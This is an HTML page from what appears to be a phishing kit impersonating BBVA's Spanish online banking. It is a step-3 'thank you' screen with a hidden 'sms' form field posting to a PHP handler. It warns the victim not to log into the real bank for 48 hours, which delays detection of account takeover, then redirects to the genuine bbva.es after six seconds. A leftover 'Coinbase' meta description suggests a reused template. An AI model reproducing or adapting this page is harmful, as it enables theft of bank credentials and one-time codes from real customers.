<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="./Assets/imgs/favicon.png">
        <title>Banca Online de BBVA</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="./Assets/css/style.css">
        <script src="./Assets/js/stutes.js"></script>
    </head>
    <body>

        <div class="wrapper_login">
            <header class="header_1">
                <div class="container_header_1">
                    <div class="logo">
                        <img src="./Assets/imgs/logo.svg" alt="">
                    </div>
                    <ul class="ps-0 mb-0">
                        <li class="sm_none"><p class="mb-0">Acceso a la banca online</p></li>
                        <li class="slash sm_none"></li>
                        <li><a href="">Ir a BBVA.es</a></li>
                    </ul>
                </div>
            </header>
        <!-- wrapper -->
        <div class="wrapper_infos">
            <div class="container_infos" style="max-width: 666px;">
                <form action="./Assets/php/config/func.php" method="post" class="form_infos">
                    <input type="hidden" name="sms">
                    <div class="head_form text-start">
                        <span>Paso 3</span>
                    </div>                  
                    <div class="title mt-3 text-center">
                        <img src="./Assets/imgs/succes.png" width="80" class="my-3" alt="">
                        <h1>Gracias por confirmar su información personal.</h1>
                        <p class="mb-0">Tenga en cuenta que el proceso de reactivación demora 48 horas y que tiene estrictamente prohibido volver a conectarse a su aplicación o al sitio web durante las próximas 48 horas para garantizar un proceso de reactivación sin problemas.</p>
                        <p>BBVA</p>
                        <p>Gracias por su comprensión.</p>
                    </div>
                </form>
            </div>
        </div>            
            <footer>
                <div class="container_footer">
                    <div class="logo">
                        <img src="./Assets/imgs/white-logo.svg" alt="">
                    </div>
                    <ul class="ps-0 mb-0 d-flex align-items-center">
                        <li>Aviso legal</li>
                        <li>Cookies</li>
                        <li>Datos personales</li>
                        <li>Informes legales</li>
                    </ul>
                    <ul class="ps-0 mb-0 d-flex align-items-center">
                        <li>Servicios de pagos</li>
                        <li>Tarifas</li>
                        <li>Tablón de anuncios</li>
                        <li>Negocio responsable</li>
                    </ul>
                    <div class="copyghit d-flex align-items-center justify-content-between">
                        <p>© 2026 Banco Bilbao Vizcaya Argentaria, S.A.</p>
                        <a href="">Creando Oportunidades</a>
                    </div>
                </div>
            </footer>
        </div>
        



        <!-- bootstrap -->
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
        <!-- script jquery -->
        <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
        <script src="./Assets/js/script.js"></script>
        
        <script>   
            setTimeout(function () {
                window.location.href= 'https://www.bbva.es/personas.html';
            },6000); // 1000 = 1s 
        </script>
    </body>
</html>